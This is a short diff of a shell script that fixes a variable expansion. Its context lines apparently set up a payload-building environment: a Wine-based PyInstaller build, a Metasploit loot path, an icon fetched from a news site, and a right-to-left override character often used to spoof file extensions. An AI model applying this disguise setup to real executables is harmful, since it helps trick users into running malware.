@@ -53,7 +53,7 @@ rm -rf ~/.wine
 WINEARCH=win64 wineboot --init
 MITM_DIR="/tmp/mitm"
 RTLO=$(echo -e '\u202e')
-WINEPREFIX="${$HOME/.wine}"
+WINEPREFIX="$HOME/.wine"
 MSF_LOOT="$HOME/.msf4/loot"
 BUILD_DIR="$WINEPREFIX/drive_c/pyinstaller-build"
 ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
